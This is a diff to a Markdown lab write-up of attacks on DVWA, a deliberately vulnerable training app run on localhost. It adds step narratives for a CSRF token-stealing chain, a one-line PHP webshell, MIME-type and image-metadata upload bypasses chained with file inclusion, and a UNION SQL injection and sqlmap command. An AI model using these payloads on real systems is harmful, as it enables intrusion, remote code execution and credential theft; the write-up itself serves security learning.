@@ -336,7 +336,12 @@ No CSRF token and no Referer check. Created an HTML file that auto-submits a pas
 
 > 💡 When a logged-in DVWA user opens `attack.html` — their password is changed to `hacked` without them clicking anything.
 
+**Step 1: Crafting the CSRF Attack File** — Created a malicious HTML file attack.html using nano, containing a hidden form that automatically submits a GET request to http://localhost/dvwa/vulnerabilities/csrf/ with password_new=hacked and password_conf=hacked on page load. When a logged-in DVWA user opens this file in their browser, the form fires instantly via document.getElementById('f').submit() without any user interaction — changing their password to hacked silently, as confirmed by the Password Changed. message visible in the browser.
+
 ![CSRF Low 1](DVWA/CSRF/low.png)
+
+**Result**
+
 ![CSRF Low 2](DVWA/CSRF/low2.png)
 
 ---
@@ -355,7 +360,11 @@ Then opened: `http://localhost/localhost/attack.html`
 > 💡 The Referer header contains `localhost` — the weak check passes even though the request is forged.
 
 ![CSRF Medium 1](DVWA/CSRF/medium1.png)
+
+Opening http://localhost/localhost/attack.html in the browser causes the forged request to carry localhost in the Referer header — tricking the weak check into passing and changing the password silently once again.
+
 ![CSRF Medium 2](DVWA/CSRF/medium2.png)
+
 ![CSRF Medium 3](DVWA/CSRF/medium3.png)
 
 ---
@@ -377,9 +386,15 @@ A proper CSRF token is required. Bypassed by **chaining with Stored XSS** — in
 
 > 💡 This runs entirely inside the victim's browser — the server sees a valid token and accepts the request.
 
+**Step 3: Bypassing the Anti-CSRF Token** — The server now includes a user_token in every request to prevent forged submissions. The attack file uses an XMLHttpRequest to first silently fetch the CSRF page, extract the valid user_token from the response using a regex match(/user_token.*?value='([^']+)'/)[1], then immediately fires a second request with the stolen token appended — password_new=hacked&password_conf=hacked&Change=Change&user_token=3ee7b1e0be18f56ddbdc570a5346713e. The entire attack runs inside the victim's browser, the server sees a valid token and accepts the request, confirming Password Changed. — proving that CSRF tokens alone fail when the application does not enforce same-origin restrictions on cross-domain requests.
+
 ![CSRF High 1](DVWA/CSRF/high1.png)
-![CSRF High 2](DVWA/CSRF/high2.png)
-![CSRF High 3](DVWA/CSRF/high3.png)
+
+Use this URL for the Bypass
+
+![CSRF High 2](DVWA/CSRF/high3.png)
+
+![CSRF High 3](DVWA/CSRF/high2.png)
 
 ---
 
@@ -445,6 +460,13 @@ No validation at all. Uploaded a one-line PHP webshell directly.
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
+![File Upload Low 1](DVWA/File%20Upload/low1.png)
+
+**Step 1: Uploading a PHP Web Shell** — Navigated to the File Upload vulnerability page which expects an image file to be uploaded. Selected a PHP file named shell.php directly without any disguise and clicked Upload. The server performed zero validation on the file type, extension, or content — accepting the PHP file as-is and confirming ../../hackable/uploads/shell.php successfully uploaded!, meaning a live PHP web shell is now sitting on the server and can be accessed directly via the browser to execute arbitrary commands.
+
+![File Upload Low 2](DVWA/File%20Upload/low2.png)
+![File Upload Low 3](DVWA/File%20Upload/low3.png)
+
 Then visited:
 ```
 http://localhost/DVWA/hackable/uploads/shell.php?cmd=id
@@ -452,9 +474,6 @@ http://localhost/DVWA/hackable/uploads/shell.php?cmd=id
 
 > ✅ Result: `uid=33(www-data) gid=33(www-data)` — full RCE confirmed.
 
-![File Upload Low 1](DVWA/File%20Upload/low1.png)
-![File Upload Low 2](DVWA/File%20Upload/low2.png)
-![File Upload Low 3](DVWA/File%20Upload/low3.png)
 ![File Upload Low 4](DVWA/File%20Upload/low4.png)
 
 ---
@@ -469,9 +488,20 @@ Content-Type: application/x-php  →  Content-Type: image/jpeg
 
 > 💡 The server trusts the Content-Type header blindly — changing it tricks the server into accepting the PHP file.
 
+**Step 1: Bypassing the MIME Type Check** — The filter now rejects the upload with Your image was not uploaded. We can only accept JPEG or PNG images. Intercepted the upload request and changed the Content-Type header from application/x-php to image/jpeg while keeping the actual PHP payload <?php system($_GET['cmd']); ?> inside the file untouched. The server only checks the Content-Type header in the request and trusts it blindly — never inspecting the actual file contents — so spoofing the MIME type to image/jpeg tricks the filter into accepting the PHP shell as if it were a legitimate image file.
+
 ![File Upload Medium 1](DVWA/File%20Upload/medium1.png)
+
+Changing PHP extension into jpeg
+
 ![File Upload Medium 2](DVWA/File%20Upload/medium2.png)
 ![File Upload Medium 3](DVWA/File%20Upload/medium3.png)
+
+Then visited:
+```
+http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami
+```
+
 ![File Upload Medium 4](DVWA/File%20Upload/medium4.png)
 
 ---
@@ -485,17 +515,21 @@ exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg
 cp photo.jpg shell.php.jpg
 ```
 
+![File Upload High 1](DVWA/File%20Upload/high1.png)
+
+> 💡 **Chained attack** — File Upload High + File Inclusion = RCE. The image passes all checks but contains executable PHP code in the metadata.
+
+![File Upload High 2](DVWA/File%20Upload/high2.png)
+![File Upload High 3](DVWA/File%20Upload/high3.png)
+
 Then triggered via File Inclusion:
 ```
 http://localhost/DVWA/vulnerabilities/fi/?page=/var/www/html/DVWA/hackable/uploads/shell.php.jpg&cmd=whoami
 ```
 
-> 💡 **Chained attack** — File Upload High + File Inclusion = RCE. The image passes all checks but contains executable PHP code in the metadata.
-
-![File Upload High 1](DVWA/File%20Upload/high1.png)
-![File Upload High 2](DVWA/File%20Upload/high2.png)
-![File Upload High 3](DVWA/File%20Upload/high3.png)
 ![File Upload High 4](DVWA/File%20Upload/high4.png)
+
+> ✅ Result: `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — full RCE confirmed.
 
 ---
 
@@ -516,6 +550,9 @@ No sanitization. The user ID goes directly into the query. Used classic UNION-ba
 1' UNION SELECT user, password FROM users-- -
 ```
 
+![SQL Injection Low 1](DVWA/sqli/low.png)
+![SQL Injection Low 2](DVWA/sqli/low2.png)
+
 Also automated with SQLMap:
 
 ```bash
@@ -525,9 +562,7 @@ sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 > ✅ SQLMap identified MySQL as the backend and dumped all databases including `dvwa`.
 
-![SQL Injection Low 1](DVWA/sqli/low1.png)
-![SQL Injection Low 2](DVWA/sqli/low2.png)
-![SQL Injection Low 3](DVWA/sqli/low3.png)
+![SQL Injection Low 3](DVWA/sqli/sqlmap.png)
 
 ---
 
@@ -541,7 +576,7 @@ The server uses `mysqli_real_escape_string()` but forgets to wrap the value in q
 ```
 
 ![SQL Injection Medium 1](DVWA/sqli/medium1.png)
-![SQL Injection Medium 2](DVWA/sqli/medium2.png)
+![SQL Injection Medium 2](DVWA/sqli/medium1.2.png)
 
 ---
 
@@ -609,7 +644,7 @@ echo -n "2" | md5sum
 
 > 💡 Matched the `dvwaSession` cookie to MD5("1") — confirming it is trivially crackable.
 
-![Weak Session High 1](sDVWA/Weak%20Session%20ID/high1.png)
+![Weak Session High 1](DVWA/Weak%20Session%20ID/high1.png)
 ![Weak Session High 2](DVWA/Weak%20Session%20ID/high2.png)
 
 ---
@@ -759,7 +794,7 @@ Script tags blocked by case-insensitive regex — but it only covers `<script>`.
 
 | Vulnerability | 🟢 Low | 🟡 Medium | 🔴 High |
 |---|---|---|---|
-| **Brute Force** | Burp Intruder | Burp Intruder | Python Script |
+| **Brute Force** | Burp Intruder | Burp Intruder | Burp Intruder |
 | **Command Injection** | `;` separator | `\|` pipe bypass | No-space `\|cmd` |
 | **CSRF** | Fake HTML form | Referer bypass | XSS + CSRF chain |
 | **File Inclusion** | Read `/etc/passwd` | Nested `..//` bypass | `file://` bypass |
